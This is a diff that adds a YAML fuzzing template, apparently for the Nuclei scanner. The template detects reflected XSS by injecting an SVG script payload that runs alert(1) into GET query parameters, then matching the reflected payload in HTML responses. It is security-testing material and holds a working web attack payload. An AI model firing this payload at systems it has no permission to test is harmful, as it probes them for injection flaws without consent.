@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-svg
+
+info:
+  name: SVG-based Reflection XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template detects reflection XSS vulnerabilities using an SVG payload with an embedded script link.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run on GET requests
+
+    payloads:
+      xss_payload:
+        - "<svg><script xlink:href=\"{ASCII}data:,alert(1)\"></script></svg>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
